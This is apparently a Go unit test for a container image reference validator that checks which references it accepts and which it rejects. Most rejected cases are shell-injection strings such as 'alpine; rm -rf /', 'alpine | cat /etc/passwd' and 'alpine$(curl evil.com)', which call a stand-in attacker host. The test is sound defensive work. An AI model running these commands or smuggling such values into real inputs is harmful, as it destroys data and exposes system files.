package api

import (
	"testing"
)

func TestValidateImageReference(t *testing.T) {
	tests := []struct {
		name    string
		ref     string
		wantErr bool
	}{
		// Valid references
		{name: "simple image", ref: "alpine", wantErr: false},
		{name: "image with tag", ref: "alpine:3.18", wantErr: false},
		{name: "image with registry", ref: "docker.io/library/alpine:latest", wantErr: false},
		{name: "image with digest", ref: "alpine@sha256:abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890", wantErr: false},
		{name: "private registry", ref: "ghcr.io/owner/repo:v1.0.0", wantErr: false},
		{name: "nested path", ref: "registry.example.com/org/team/image:tag", wantErr: false},

		// Empty
		{name: "empty string", ref: "", wantErr: true},

		// Shell metacharacter injection attempts
		{name: "semicolon injection", ref: "alpine; rm -rf /", wantErr: true},
		{name: "pipe injection", ref: "alpine | cat /etc/passwd", wantErr: true},
		{name: "ampersand injection", ref: "alpine && curl evil.com", wantErr: true},
		{name: "dollar sign injection", ref: "alpine$(curl evil.com)", wantErr: true},
		{name: "backtick injection", ref: "alpine`curl evil.com`", wantErr: true},
		{name: "parenthesis injection", ref: "alpine()", wantErr: true},
		{name: "curly brace injection", ref: "alpine{0..9}", wantErr: true},
		{name: "single quote injection", ref: "alpine'test", wantErr: true},
		{name: "double quote injection", ref: `alpine"test`, wantErr: true},
		{name: "backslash injection", ref: `alpine\test`, wantErr: true},
		{name: "newline injection", ref: "alpine\nid", wantErr: true},
		{name: "carriage return injection", ref: "alpine\rid", wantErr: true},
		{name: "redirect injection", ref: "alpine > /tmp/out", wantErr: true},
		{name: "exclamation injection", ref: "alpine!test", wantErr: true},

		// Length limit
		{name: "exceeds max length", ref: "registry.example.com/org/" + string(make([]byte, 500)), wantErr: true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateImageReference(tt.ref)
			if (err != nil) != tt.wantErr {
				t.Errorf("validateImageReference(%q) error = %v, wantErr %v", tt.ref, err, tt.wantErr)
			}
		})
	}
}
